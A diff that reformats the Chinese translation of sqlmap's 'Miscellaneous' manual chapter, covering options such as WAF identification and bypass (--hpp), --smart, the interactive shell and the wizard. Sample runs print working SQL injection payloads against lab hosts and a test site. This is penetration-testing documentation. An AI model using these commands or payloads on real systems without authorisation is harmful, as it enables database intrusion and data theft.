@@ -1,6 +1,6 @@
-## 杂项
+# 杂项
 
-### 使用短助记符
+## 使用短助记符
 
 选项：`-z`
 
@@ -10,37 +10,37 @@
 
 例如：
 
-```
+```shell
 $ python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "ww\
 w.target.com/vuln.php?id=1"
 ```
 
 可以用短助记符形式（多种方法之一）写成：
 
-```
+```shell
 $ python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=\
 1"
 ```
 
 另一个例子：
 
-```
+```shell
 $ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testd\
 b -T users -u "www.target.com/vuln.php?id=1"
 ```
 
 可以用短助记符形式写成：
 
-```
+```shell
 $ python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.\
 com/vuln.php?id=1"
 ```
 
-### 警告成功的 SQL 注入检测
+## 警告成功的 SQL 注入检测
 
 选项：`--alert`
 
-### 为问题设置答案
+## 为问题设置答案
 
 选项：`--answers`
 
@@ -48,37 +48,36 @@ com/vuln.php?id=1"
 
 针对 MySQL 目标的示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--te\
 chnique=E --answers="extending=N" --batch
 [...]
 [xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
-heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you 
-want to skip test payloads specific for other DBMSes? [Y/n] Y
+heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
 [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provide
 d level (1) and risk (1)? [Y/n] N
 [...]
 ```
 
-### 发现 SQL 注入时发出“哔”声
+## 发现 SQL 注入时发出“哔”声
 
 开关：`--beep`
 
 如果用户使用了开关 `--beep`，那么在发现 SQL 注入时，sqlmap 会立即发出“哔”的警告声。当测试的目标 URLs 是大批量列表（选项 `-m`）时特别有用。
 
-### 清除 DBMS（Database Management System，数据库管理系统）中特定的 sqlmap UDF(s) 和表
+## 清除 DBMS（Database Management System，数据库管理系统）中特定的 sqlmap UDF(s) 和表
 
 开关：`--cleanup`
 
 建议在完成底层操作系统或文件系统的接管后，清理后端 DBMS 中的 sqlmap 临时表（如 `sqlmapoutput`）和用户定义函数。使用 `--cleanup` 开关将尽可能地清理 DBMS 和文件系统。
 
-### 检查依赖关系
+## 检查依赖关系
 
 开关：`--dependencies`
 
 在某些特殊情况下，sqlmap 需要独立安装额外的第三方库（例如：选项 `-d`，开关 `--os-pwn` 之于 `icmpsh` 隧道，选项 `--auth-type` 之于 `NTLM` 类型的 HTTP 认证等。），只在这种特殊情况下会警告用户。不过，如果你想独立检查所有这些额外的第三方库依赖关系，可以使用开关 `--dependencies`。
 
-```
+```shell
 $ python sqlmap.py --dependencies
 [...]
 [xx:xx:28] [WARNING] sqlmap requires 'python-kinterbasdb' third-party library in
@@ -116,25 +115,25 @@ ou plan to attack a web application using WebSocket. Download from https://pypi.
 python.org/pypi/websocket-client/
 ```
 
-### 禁用控制台输出着色
+## 禁用控制台输出着色
 
 开关：`--disable-coloring`
 
 默认情况下，sqlmap 输出到控制台时使用着色。你可以使用此开关禁用控制台输出着色，以避免不期望的效果（例如：控制台中未解析的 ANSI 代码着色效果，像 `\x01\x1b[0;32m\x02[INFO]`）。
 
-### 使用特定页码的 Google dork 结果
+## 使用特定页码的 Google dork 结果
 
 选项：`--gpage`
 
 默认情况下，使用选项 `-g` 时，sqlmap 会使用 Google 搜索得到的前 100 个 URLs 进行进一步的 SQL 注入测试。结合此选项，你可以使用它（`--gpage`）指定除第一页以外的页面以检索目标 URLs。
 
-### 使用 HTTP 参数污染
+## 使用 HTTP 参数污染
 
 开关：`--hpp`
 
 HTTP 参数污染（HPP）是一种绕过 WAF/IPS 防护机制（[这里](https://www.imperva.com/resources/glossary/http-parameter-pollution) 有相关介绍）的方法，对 ASP/IIS 和 ASP.NET/IIS 平台尤其有效。如果你怀疑目标使用了这种防护机制，可以尝试使用此开关以绕过它。
 
-### 针对 WAF/IPS 防护进行彻底的测试
+## 针对 WAF/IPS 防护进行彻底的测试
 
 开关：`--identify-waf`
 
@@ -142,7 +141,7 @@ sqlmap 可以尝试识别后端 WAF/IPS 防护（如果有），以便用户可�
 
 针对受 ModSecurity WAF 防护的 MySQL 目标示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --i\
 dentify-waf -v 3
 [...]
@@ -155,8 +154,7 @@ ited Security Providers)'
 irewall (BinarySEC)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'NetContinuum Web Applicatio
 n Firewall (NetContinuum/Barracuda Networks)'
-[xx:xx:23] [DEBUG] checking for WAF/IPS product 'Hyperguard Web Application 
-Firewall (art of defence Inc.)'
+[xx:xx:23] [DEBUG] checking for WAF/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'Cisco ACE XML Gateway (Cisc
 o Systems)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'TrafficShield (F5 Networks)
@@ -167,8 +165,7 @@ rewall Enterprise (Teros/Citrix Systems)'
 amai Technologies)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'Incapsula Web Application F
 irewall (Incapsula/Imperva)'
-[xx:xx:23] [DEBUG] checking for WAF/IPS product 'CloudFlare Web Application 
-Firewall (CloudFlare)'
+[xx:xx:23] [DEBUG] checking for WAF/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'Barracuda Web Application F
 irewall (Barracuda Networks)'
 [xx:xx:23] [DEBUG] checking for WAF/IPS product 'webApp.secure (webScurity)'
@@ -191,13 +188,13 @@ cation Firewall (Trustwave)'. Please consider usage of tamper scripts (option '-
 [...]
 ```
 
-### 跳过启发式检测 WAF/IPS 防护
+## 跳过启发式检测 WAF/IPS 防护
 
 开关：`--skip-waf`
 
 默认情况下，sqlmap 自动在一个启动请求中发送一个虚假的参数值，其中包含一个有意“可疑”的 SQL 注入 payload（例如：`...&foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1`）。如果目标响应与原始请求响应不同，那么它很可能存在防护机制。如果有任何问题，用户可以使用开关 `--skip-waf` 来禁用此机制。
 
-### 伪装智能手机
+## 伪装智能手机
 
 开关：`--mobile`
 
@@ -205,7 +202,7 @@ cation Firewall (Trustwave)'. Please consider usage of tamper scripts (option '-
 
 运行示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
 [...]
 which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
@@ -220,13 +217,13 @@ which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
 [...]
 ```
 
-### 离线工作模式（仅使用会话数据）
+## 离线工作模式（仅使用会话数据）
 
 开关：`--offline`
 
 使用开关 `--offline`，sqlmap 在数据枚举中将仅使用上一个会话的数据。这基本上意味着在这样的运行过程中是零连接尝试的。
 
-### 安全地删除 data 目录中所有内容
+## 安全地删除 data 目录中所有内容
 
 开关：`--purge`
 
@@ -236,7 +233,7 @@ While purging, all files from (sub)directories in data folder will be overwritte
 
 运行示例：
 
-```
+```shell
 $ python sqlmap.py --purge -v 3
 [...]
 [xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap'...
@@ -249,7 +246,7 @@ $ python sqlmap.py --purge -v 3
 [...]
 ```
 
-### 只有在使用启发式检测时才进行彻底的测试
+## 只有在使用启发式检测时才进行彻底的测试
 
 开关：`--smart`
 
@@ -257,14 +254,13 @@ $ python sqlmap.py --purge -v 3
 
 针对 MySQL 目标的示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&use\
 r=foo&id=1" --batch --smart
 [...]
 [xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
 [xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
-[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might 
-not be injectable
+[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable
 [xx:xx:14] [INFO] skipping GET parameter 'ca'
 [xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
 [xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
@@ -275,31 +271,25 @@ t not be injectable
 [xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
 [xx:xx:14] [INFO] GET parameter 'id' is dynamic
 [xx:xx:14] [WARNING] reflective value(s) found and filtering out
-[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be 
-injectable (possible DBMS: 'MySQL')
+[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
 [xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
-heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you 
-want to skip test payloads specific for other DBMSes? [Y/n] Y
+heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
 do you want to include all tests for 'MySQL' extending provided level (1) and ri
 sk (1)? [Y/n] Y
 [xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
 [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVI
-NG clause' injectable 
-[xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+NG clause' injectable [xx:xx:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause
 '
 [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or
- HAVING clause' injectable 
-[xx:xx:14] [INFO] testing 'MySQL inline queries'
+ HAVING clause' injectable [xx:xx:14] [INFO] testing 'MySQL inline queries'
 [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 stacked queries'
 [xx:xx:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
 [xx:xx:14] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
-[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in
-jectable 
+[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' in jectable
 [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
 [xx:xx:24] [INFO] automatically extending ranges for UNION query injection techn
 ique tests as there is at least one other potential injection technique found
-[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the 
-time needed to find the right number of query columns. Automatically extending t
+[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending t
 he range for current UNION query injection technique test
 [xx:xx:24] [INFO] target URL appears to have 3 columns in query
 [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 colu
@@ -307,7 +297,7 @@ mns' injectable
 [...]
 ```
 
-### 根据 payloads 和/或标题选择（或跳过）测试
+## 根据 payloads 和/或标题选择（或跳过）测试
 
 选项：`--test-filter`
 
@@ -315,20 +305,18 @@ mns' injectable
 
 针对 MySQL 目标的示例：
 
-```
+```shell
 $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --b\
 atch --test-filter=ROW
 [...]
 [xx:xx:39] [INFO] GET parameter 'id' is dynamic
 [xx:xx:39] [WARNING] reflective value(s) found and filtering out
-[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be 
-injectable (possible DBMS: 'MySQL')
+[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
 [xx:xx:39] [INFO] testing for SQL injection on GET parameter 'id'
 [xx:xx:39] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause
 '
 [xx:xx:39] [INFO] GET parameter 'id' is 'MySQL >= 4.1 AND error-based - WHERE or
- HAVING clause' injectable 
-GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
+ HAVING clause' injectable GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
 )? [y/N] N
 sqlmap identified the following injection points with a total of 3 HTTP(s) reque
 sts:
@@ -341,8 +329,7 @@ Parameter: id
 T (C
     ASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FRO
 M (S
-    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY 
-x)
+    ELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)
 ---
 [...]
 ```
@@ -351,13 +338,13 @@ x)
 
 如果你想根据 payloads 和/或标题跳过测试，可以使用此选项。例如，想要跳过包含 `BENCHMARK` 关键字的 payloads，可以使用 `--test-skip=BENCHMARK`。
 
-### 交互式 sqlmap shell
+## 交互式 sqlmap shell
 
 开关：`--sqlmap-shell`
 
 使用开关 `--sqlmap-shell`，用户可以看到交互式的 sqlmap shell，它具有所有以前运行的历史记录，包括使用过的选项和/或开关：
 
-```
+```shell
 $ python sqlmap.py --sqlmap-shell
 sqlmap-shell> -u "http://testphp.vulnweb.com/artists.php?artist=1" --technique=\
 BEU --batch
@@ -368,8 +355,7 @@ BEU --batch
       |_|           |_|   http://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
- consent is illegal. It is the end user's responsibility to obey all applicable 
-local, state and federal laws. Developers assume no liability and are not respon
+ consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
 sible for any misuse or damage caused by this program
 
 [*] starting at xx:xx:11
@@ -385,11 +371,9 @@ sible for any misuse or damage caused by this program
 [xx:xx:13] [INFO] testing for SQL injection on GET parameter 'artist'
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 ecific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending 
-provided level (1) and risk (1) values? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
 [xx:xx:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[xx:xx:13] [INFO] GET parameter 'artist' seems to be 'AND boolean-based blind - 
-WHERE or HAVING clause' injectable 
+[xx:xx:13] [INFO] GET parameter 'artist' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
 [xx:xx:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER B
 Y or GROUP BY clause'
 [xx:xx:13] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY
@@ -422,14 +406,11 @@ VALUE)'
 [xx:xx:15] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEX
 ML)'
 [xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
-[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT 
-UNSIGNED)'
+[xx:xx:15] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
 [xx:xx:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
 [xx:xx:15] [INFO] automatically extending ranges for UNION query injection techn
 ique tests as there is at least one other (potential) technique found
-[xx:xx:15] [INFO] ORDER BY technique seems to be usable. This should reduce the 
-time needed to find the right number of query columns. Automatically extending t
-he range for current UNION query injection technique test
+[xx:xx:15] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
 [xx:xx:15] [INFO] target URL appears to have 3 columns in query
 [xx:xx:16] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 2
 0 columns' injectable
@@ -464,13 +445,12 @@ sqlmap-shell> -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner
       |_|           |_|   http://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
- consent is illegal. It is the end user's responsibility to obey all applicable 
-local, state and federal laws. Developers assume no liability and are not respon
+ consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
 sible for any misuse or damage caused by this program
 
 [*] starting at xx:xx:25
 
-[xx:xx:26] [INFO] resuming back-end DBMS 'mysql' 
+[xx:xx:26] [INFO] resuming back-end DBMS 'mysql'
 [xx:xx:26] [INFO] testing connection to the target URL
 sqlmap resumed the following injection point(s) from stored session:
 ---
@@ -491,12 +471,11 @@ web application technology: Nginx, PHP 5.3.10
 back-end DBMS operating system: Linux Ubuntu
 back-end DBMS: MySQL 5
 banner:    '5.1.73-0ubuntu0.10.04.1'
-[xx:xx:26] [INFO] fetched data logged to text files under '/home/stamparm/.sqlma
-p/output/testphp.vulnweb.com' 
+[xx:xx:26] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/testphp.vulnweb.com'
 sqlmap-shell> exit
 ```
 
-### 适合初学者使用的向导界面
+## 适合初学者使用的向导界面
 
 开关：`--wizard`
 
@@ -504,22 +483,21 @@ sqlmap 为初学者提供了一个向导界面，它使用包含尽可能少的�
 
 针对 Microsoft SQL Server 目标的示例：
 
-```
+```shell
 $ python sqlmap.py --wizard
 
     sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
     http://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
- consent is illegal. It is the end user's responsibility to obey all applicable 
-local, state and federal laws. Developers assume no liability and are not respon
+ consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not respon
 sible for any misuse or damage caused by this program
 
 [*] starting at xx:xx:26
 
 Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_in
 t.asp?id=1
-POST data (--data) [Enter for None]: 
+POST data (--data) [Enter for None]:
 Injection difficulty (--level/--risk). Please choose:
 [1] Normal (default)
 [2] Medium
@@ -558,7 +536,7 @@ HAR(58)+(SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58
     Title: Generic UNION query (NULL) - 3 columns
     Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58)+CHAR(118)+CHAR(114)+CHAR(1
 00)+CHAR(58)+CHAR(70)+CHAR(79)+CHAR(118)+CHAR(106)+CHAR(87)+CHAR(101)+CHAR(119)+
-CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)-- 
+CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)--
 
     Type: stacked queries
     Title: Microsoft SQL Server/Sybase stacked queries
@@ -570,7 +548,7 @@ CHAR(115)+CHAR(114)+CHAR(77)+CHAR(58)+CHAR(111)+CHAR(109)+CHAR(113)+CHAR(58)--
 
     Type: inline query
     Title: Microsoft SQL Server/Sybase inline queries
-    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT 
+    Payload: id=(SELECT CHAR(58)+CHAR(118)+CHAR(114)+CHAR(100)+CHAR(58)+(SELECT
 (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR
 (109)+CHAR(113)+CHAR(58))
 ---
@@ -580,8 +558,8 @@ back-end DBMS operating system: Windows XP Service Pack 2
 back-end DBMS: Microsoft SQL Server 2005
 banner:
 ---
-Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
-    Oct 14 2005 00:33:37 
+Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)
+    Oct 14 2005 00:33:37
     Copyright (c) 1988-2005 Microsoft Corporation
     Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
 ---
